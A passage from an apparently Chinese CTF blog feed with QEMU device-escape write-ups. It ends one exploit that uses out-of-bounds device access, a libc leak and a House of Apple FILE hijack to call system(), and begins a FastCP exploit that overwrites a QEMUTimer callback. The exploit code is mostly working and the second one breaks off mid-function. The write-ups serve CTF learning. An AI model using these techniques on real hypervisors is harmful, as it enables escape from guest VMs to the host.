lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">va2pa</span><span class="params">(<span class="type">void</span> *addr)</span>{</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>)))){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>{</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)( mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>{</span><br><span class="line">        *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,addr);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">    LOG(<span class="string">"mmio_init"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pmio</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        Err(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">    LOG(<span class="string">"pmio_init"</span>);</span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pa</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    LOG(<span class="string">"pa_init"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* passwd = <span class="string">"ACTF{cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!}"</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span></span><br><span class="line">{</span><br><span class="line">    mmio_write(<span class="number">0x40</span>,(addr&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0x10</span>,(val&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0x14</span>,(val&gt;&gt;<span class="number">32</span>));</span><br><span class="line">    LOG(<span class="string">"oobwrite!"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    init_pa();</span><br><span class="line">    init_mmio();</span><br><span class="line">    init_pmio();</span><br><span class="line"></span><br><span class="line"><span class="comment">// login</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x40</span>;i += <span class="number">4</span>)</span><br><span class="line">    {</span><br><span class="line">        mmio_write(i,*(<span class="type">uint32_t</span>*)(passwd+i));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    pmio_writeb(pmio_base+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> authentication = pmio_readb(pmio_base+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(authentication==<span class="number">1</span>)</span><br><span class="line">        LOG(<span class="string">"login successful"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        Err(<span class="string">"login fail"</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line"><span class="comment">// leak_libc</span></span><br><span class="line">    pmio_write(pmio_base+<span class="number">0x10</span>,<span class="string">'a'</span>);</span><br><span class="line">    <span class="type">uint32_t</span> buflow = mmio_read(<span class="number">0x40</span>);</span><br><span class="line">    HEX(buflow);</span><br><span class="line">    mmio_write(<span class="number">0x40</span>,(buflow&amp;<span class="number">0xff000000</span>)+<span class="number">0x8a0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> heap1  =  pmio_read(pmio_base+<span class="number">0x10</span>);</span><br><span class="line">    heap1 |= (pmio_read(pmio_base+<span class="number">0x14</span>)&lt;&lt;<span class="number">32</span>);</span><br><span class="line">    HEX(heap1);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x40</span>,(heap1+<span class="number">0x870</span>)&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> addr  =  pmio_read(pmio_base+<span class="number">0x10</span>);</span><br><span class="line">    addr |= (pmio_read(pmio_base+<span class="number">0x14</span>)&lt;&lt;<span class="number">32</span>);</span><br><span class="line">    HEX(addr);</span><br><span class="line">    <span class="comment">// libc_base = buf+0x51310e80 0x53d52f90</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libc_base = addr - <span class="number">0x219C80</span>;</span><br><span class="line">    <span class="comment">// uint64_t libc_base = addr + 0x1912C80;</span></span><br><span class="line">    HEX(libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// house of apple</span></span><br><span class="line">    LOG(<span class="string">"House of Apple"</span>);</span><br><span class="line">    <span class="type">uint64_t</span> fake_io_addr  = (heap1 + <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">uint64_t</span> _IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> _IO_list_all_addr = libc_base + <span class="number">0x21a680</span>; </span><br><span class="line">    <span class="type">uint64_t</span> stdout_addt = libc_base + <span class="number">0x21a780</span>;</span><br><span class="line">    <span class="type">uint64_t</span> system_addr = libc_base + <span class="number">0x50d70</span>;</span><br><span class="line">    <span class="type">uint64_t</span> stdin_addr =  libc_base + <span class="number">0x219aa0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">0x18</span>] = <span class="string">"  cat flag 1&gt;&amp;2"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">0x18</span>;i += <span class="number">8</span>)</span><br><span class="line">    {</span><br><span class="line">        oob_write(fake_io_addr+i,*(<span class="type">uint64_t</span>*)(cmd+i));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0x18</span>,<span class="number">0</span>);</span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0x28</span>,<span class="number">1</span>);</span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0x30</span>,<span class="number">0</span>);   </span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0x68</span>,system_addr);   </span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0xa0</span>,fake_io_addr);</span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0xd8</span>,_IO_wfile_jumps);</span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0xe0</span>,fake_io_addr);</span><br><span class="line">    LOG(<span class="string">"Prepared!"</span>);</span><br><span class="line">    HEX(fake_io_addr);</span><br><span class="line"></span><br><span class="line">    oob_write(_IO_list_all_addr,fake_io_addr);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在关机的时候泄露出flag.有种引爆炸弹的感觉.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312011636968.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 HWS FastCP</title>
      <link href="/2023/2021%20HWS%20FastCP/"/>
      <url>/2023/2021%20HWS%20FastCP/</url>
      
        <content type="html"><![CDATA[<p>还是熟悉的越界读写,CP_buffer之后有个QEMUTIMER结构体,劫持其cb指针为system,opaque为cmd即可.<br>对QemuTimer Callback的回调机制可以看: <a href="https://hanqi-blogs.cn/2023/QemuTimer-Callback">QemuTimer Callback机制</a></p><span id="more"></span><p>关键结构体如下:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCPState</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  CP_state cp_state;</span><br><span class="line">  <span class="type">uint8_t</span> handling;</span><br><span class="line">  <span class="type">uint32_t</span> irq_status;</span><br><span class="line">  <span class="type">char</span> CP_buffer[<span class="number">4096</span>];</span><br><span class="line">  QEMUTimer_0 cp_timer;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CP_state</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">uint64_t</span> CP_list_src;</span><br><span class="line">  <span class="type">uint64_t</span> CP_list_cnt;</span><br><span class="line">  <span class="type">uint64_t</span> cmd;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">uint64_t</span> CP_src;</span><br><span class="line">  <span class="type">uint64_t</span> CP_cnt;</span><br><span class="line">  <span class="type">uint64_t</span> CP_dst;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">int64_t</span> expire_time;</span><br><span class="line">  QEMUTimerList_0 *timer_list;</span><br><span class="line">  QEMUTimerCB *cb;</span><br><span class="line">  <span class="type">void</span> *opaque;</span><br><span class="line">  QEMUTimer_0 *next;</span><br><span class="line">  <span class="type">int</span> attributes;</span><br><span class="line">  <span class="type">int</span> scale;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>要注意的一点是我们需要从指定的物理地址连续拷贝一页以上的数据到设备中,而mmap出的多个页面不一定在物理地址空间中连续,可以使用HugePage,其保证在物理内存中是连续的(在mmap中指定MAP_HUGETLB).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"sysctl vm.nr_hugepages=1"</span>); <span class="comment">//当然多一点也行</span></span><br><span class="line"><span class="type">char</span>* buf = mmap(<span class="literal">NULL</span>,<span class="number">2048</span>*<span class="number">1024</span>,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS|MAP_HUGETLB,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入页面使得物理内存正式分配.</span></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">2048</span>*<span class="number">1024</span>);</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311292009419.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef unsigned long long uint64_t;</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pmio_base = <span class="number">0x000000000000c050</span>;</span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span>* MAGIC = <span class="string">"HANQING!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    perror(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        Err(<span class="string">"open pagemap"</span>);</span><br><span class="line">    }</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> size)</span>{</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint64_t</span> *)( mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>{</span><br><span class="line">        *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem==<span class="number">-1</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pa</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CP_INFO</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">uint64_t</span> CP_src;</span><br><span class="line">  <span class="type">uint64_t</span> CP_cnt;</span><br><span class="line">  <span class="type">uint64_t</span> CP_dst;</span><br><span class="line">}CP_INFO;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_from_CP_buffer</span><span class="params">(<span class="type">void</span>* dst,<span class="type">uint64_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    CP_INFO cp_info;</span><br><span class="line">    cp_info.CP_cnt = cnt;</span><br><span class="line">    cp_info.CP_dst = gva_to_gpa(dst);</span><br><span class="line">    mmio_write(<span class="number">8</span>,gva_to_gpa(&amp;cp_info));</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">1</span>);</span><br><span class="line">    